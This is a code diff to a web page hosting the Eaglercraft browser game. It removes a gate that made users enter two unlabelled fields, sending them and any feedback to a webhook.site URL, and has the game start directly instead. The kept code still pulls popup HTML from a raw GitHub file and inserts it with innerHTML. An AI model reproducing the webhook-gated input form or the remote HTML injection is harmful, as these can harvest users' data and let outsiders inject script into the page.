@@ -71,55 +71,6 @@
         #popup-menu button:hover {
             background: #666;
         }
-
-        #feedback-form textarea {
-            width: 100%;
-            padding: 5px;
-            margin-top: 10px;
-            border-radius: 5px;
-            border: none;
-        }
-
-        #input-page {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: rgba(30, 30, 30, 0.95);
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            z-index: 1001;
-            font-family: sans-serif;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
-            text-align: center;
-            display: none;
-        }
-
-        #input-page.visible {
-            display: block;
-        }
-
-        #input-page input {
-            width: 100%;
-            padding: 5px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border: none;
-        }
-
-        #input-page button {
-            padding: 5px 15px;
-            border: none;
-            background: #444;
-            color: white;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        #input-page button:hover {
-            background: #666;
-        }
     </style>
 </head>
 <body id="game_frame">
@@ -128,17 +79,11 @@
         <img src="Splash.png" alt="Custom Splash Screen">
     </div>
 
-    <div id="input-page">
-        <p>Enter your input below (both fields required):</p>
-        <input type="text" id="input1" placeholder="First input">
-        <input type="text" id="input2" placeholder="Second input">
-        <button onclick="submitInputs()">Submit</button>
-    </div>
-
     <div id="popup-menu">
         <p>PUBES VS GOON WAR</p>
         <p>I am testing a new feature</p>
         <p>with a automatic news updater</p>
+        <p>Email me if you have any ideas for this</p>
     </div>
 
     <script type="text/javascript">
@@ -157,120 +102,6 @@
             document.getElementById('popup-menu').style.display = 'none';
         }
         
-        async function submitFeedback() {
-            const feedback = document.getElementById('feedback-input').value;
-            if (!feedback) {
-                alert('Please enter feedback before submitting.');
-                return;
-            }
-            try {
-                const response = await fetch('https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        type: 'feedback',
-                        content: feedback,
-                        timestamp: new Date().toISOString()
-                    })
-                });
-                if (response.ok) {
-                    alert('Feedback submitted successfully!');
-                    document.getElementById('feedback-input').value = '';
-                } else {
-                    alert('Failed to submit feedback.');
-                }
-            } catch (error) {
-                console.error('Error submitting feedback:', error);
-                alert('Error submitting feedback.');
-            }
-        }
-        
-        async function submitInputs() {
-            const input1 = document.getElementById('input1').value.trim();
-            const input2 = document.getElementById('input2').value.trim();
-            if (!input1 || !input2) {
-                alert('Please fill both input fields before submitting.');
-                return;
-            }
-            try {
-                const response = await fetch('https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        type: 'input_page',
-                        input1: input1,
-                        input2: input2,
-                        timestamp: new Date().toISOString()
-                    })
-                });
-                if (response.ok) {
-                    alert('Inputs submitted successfully!');
-                    document.getElementById('input1').value = '';
-                    document.getElementById('input2').value = '';
-                    document.getElementById('input-page').classList.remove('visible');
-                    
-                    // Proceed with game initialization
-                    const classesScript = document.createElement("script");
-                    classesScript.src = "classes.js";
-                    classesScript.onerror = () => console.error("Failed to load classes.js");
-                    document.head.appendChild(classesScript);
-
-                    const ga4Script = document.createElement("script");
-                    ga4Script.src = "/js/ga4.js";
-                    ga4Script.onerror = () => console.error("Failed to load ga4.js");
-                    document.head.appendChild(ga4Script);
-
-                    await new Promise(resolve => {
-                        classesScript.onload = resolve;
-                    });
-
-                    for (let i = 0; i < 20; i++) {
-                        const keyEvent = new KeyboardEvent("keydown", {
-                            key: "Enter",
-                            code: "Enter",
-                            keyCode: 13,
-                            which: 13,
-                            bubbles: true,
-                            cancelable: true
-                        });
-                        document.dispatchEvent(keyEvent);
-                    }
-
-                    try {
-                        if (window.location.href.indexOf("file:") === 0) {
-                            alert("HTTP please, do not open this file locally, run a local HTTP server and load it via HTTP");
-                        } else {
-                            var relayId = Math.floor(Math.random() * 3);
-                            window.eaglercraftXOpts = {
-                                demoMode: false,
-                                container: "game_frame",
-                                assetsURI: "assets.epk",
-                                localesURI: "lang/",
-                                worldsDB: "worlds",
-                                servers: []
-                            };
-                            main();
-                        }
-                    } catch (e) {
-                        console.error("Error during game initialization:", e);
-                    }
-
-                    // Start popup visibility and content updates
-                    updatePopupContent();
-                    ensurePopupVisibility();
-                } else {
-                    alert('Failed to submit inputs.');
-                }
-            } catch (error) {
-                console.error('Error submitting inputs:', error);
-                alert('Error submitting inputs.');
-            }
-        }
-        
         const popupContentUrl = 'https://raw.githubusercontent.com/maskedwrrg/repo/refs/heads/main/popup-content.txt';
         const updateInterval = 30000;
         
@@ -281,12 +112,7 @@
                     const newContent = await response.text();
                     const popup = document.getElementById('popup-menu');
                     if (popup && newContent) {
-                        popup.innerHTML = newContent + `
-                            <p>Submit feedback or ideas:</p>
-                            <div id="feedback-form">
-                                <textarea id="feedback-input" rows="4" placeholder="Enter your feedback"></textarea>
-                                <button onclick="submitFeedback()">Submit</button>
-                            </div>`;
+                        popup.innerHTML = newContent;
                         originalPopupContent = newContent;
                     }
                 }
@@ -311,6 +137,13 @@
         }
 
         window.addEventListener("load", async function () {
+            const popup = document.getElementById('popup-menu');
+            if (popup) {
+                originalPopupContent = popup.innerHTML;
+            }
+            
+            updatePopupContent();
+            
             window.isSplashScreenActive = true;
             window.suppressSplashScreens = true;
 
@@ -318,13 +151,54 @@
             await new Promise(resolve => setTimeout(resolve, 10000));
             window.isSplashScreenActive = false;
 
+            const classesScript = document.createElement("script");
+            classesScript.src = "classes.js";
+            classesScript.onerror = () => console.error("Failed to load classes.js");
+            document.head.appendChild(classesScript);
+
+            const ga4Script = document.createElement("script");
+            ga4Script.src = "/js/ga4.js";
+            ga4Script.onerror = () => console.error("Failed to load ga4.js");
+            document.head.appendChild(ga4Script);
+
+            await new Promise(resolve => {
+                classesScript.onload = resolve;
+            });
+
+            for (let i = 0; i < 20; i++) {
+                const keyEvent = new KeyboardEvent("keydown", {
+                    key: "Enter",
+                    code: "Enter",
+                    keyCode: 13,
+                    which: 13,
+                    bubbles: true,
+                    cancelable: true
+                });
+                document.dispatchEvent(keyEvent);
+            }
+
             splashScreen.classList.add("hidden");
 
-            // Show input page after splash screen
-            const inputPage = document.getElementById('input-page');
-            if (inputPage) {
-                inputPage.classList.add('visible');
+            try {
+                if (window.location.href.indexOf("file:") === 0) {
+                    alert("HTTP please, do not open this file locally, run a local HTTP server and load it via HTTP");
+                } else {
+                    var relayId = Math.floor(Math.random() * 3);
+                    window.eaglercraftXOpts = {
+                        demoMode: false,
+                        container: "game_frame",
+                        assetsURI: "assets.epk",
+                        localesURI: "lang/",
+                        worldsDB: "worlds",
+                        servers: []
+                    };
+                    main();
+                }
+            } catch (e) {
+                console.error("Error during game initialization:", e);
             }
+
+            ensurePopupVisibility();
         });
         
         window.addEventListener('DOMContentLoaded', () => {
@@ -338,7 +212,7 @@
                 if (!popup || !document.body.contains(popup)) {
                     const newPopup = document.createElement("div");
                     newPopup.id = "popup-menu";
-                    newPopup.innerHTML = originalPopupContent + ``;
+                    newPopup.innerHTML = originalPopupContent;
                     document.body.appendChild(newPopup);
                 }
             });
